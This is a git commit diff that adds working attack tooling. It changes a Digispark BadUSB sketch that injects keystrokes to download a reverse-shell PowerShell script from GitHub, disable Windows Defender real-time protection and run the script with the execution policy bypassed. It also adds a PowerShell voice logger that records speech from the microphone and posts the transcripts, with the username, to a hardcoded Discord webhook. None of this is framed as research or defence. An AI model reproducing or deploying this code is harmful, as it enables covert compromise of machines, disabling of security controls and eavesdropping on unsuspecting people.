541d8cb283959ee4c3ed7abf9c212d6e5d87146f
GitSimonVetter <Simon@DESKTOP-11T1LOR>
2024-12-01 15:08:38 +0100

    sigma

--- Arduino/DigisparkScript/DigisparkScript.ino
+++ Arduino/DigisparkScript/DigisparkScript.ino
@@ -1,15 +1,43 @@
-#include "DigiKeyboardDe.h"
+#include <DigiKeyboard.h>
+#include <DigiKeyboardDe.h>
+#include <oddebug.h>
+#include <osccal.h>
+#include <osctune.h>
+#include <scancode-ascii-table.h>
+#include <usbconfig-prototype.h>
+#include <usbconfig.h>
+#include <usbdrv.h>
+#include <usbportability.h>
+
 void setup() {
   // put your setup code here, to run once:
-  DigiKeyboardDe.sendKeyStroke(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.println("cmd");
+  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_RIGHT);
+  DigiKeyboardDe.delay(500);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
+  DigiKeyboardDe.delay(100);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
   DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell curl  'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -o malware.ps1");
+  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboardDe.delay(500);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.delay(1000);
+  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell Invoke-WebRequest  -Uri 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -OutFile malware.ps1");
+  DigiKeyboardDe.delay(500);
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.delay(500);
+  DigiKeyboardDe.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
+  DigiKeyboardDe.delay(500);
+  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardDe.delay(500);
   DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File malware.ps1");
   DigiKeyboardDe.delay(500);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
---
+++ VL.ps1
@@ -0,0 +1,49 @@
+$dc="https://discord.com/api/webhooks/1312768108989124638/q1m2IL5i33PVVxzn8iWfraHO7FlG9duVntfkpdHlJG1VY5PXGFbAekcn9pmnBww4_KId"
+function DC-Upload {
+
+	[CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$False)]
+		[string]$text 
+	)
+
+
+	$Body = @{
+	  'username' = $env:username
+	  'content' = $text
+	}
+
+	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
+}
+
+
+
+function voiceLogger {
+
+    Add-Type -AssemblyName System.Speech
+    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+    $grammar = New-Object System.Speech.Recognition.DictationGrammar
+    $recognizer.LoadGrammar($grammar)
+    $recognizer.SetInputToDefaultAudioDevice()
+
+    while ($true) {
+        $result = $recognizer.Recognize()
+        if ($result) {
+            $results = $result.Text
+            Write-Output $results
+            $log = "$env:tmp/VoiceLog.txt"
+            echo $results > $log
+            $text = get-content $log -raw
+            DC-Upload $text
+
+            # Use a switch statement with the $results variable
+            switch -regex ($results) {
+                '\bnote\b' {saps notepad}
+                '\bexit\b' {break}
+            }
+        }
+    }
+    Clear-Content -Path $log
+}
+
+voiceLogger
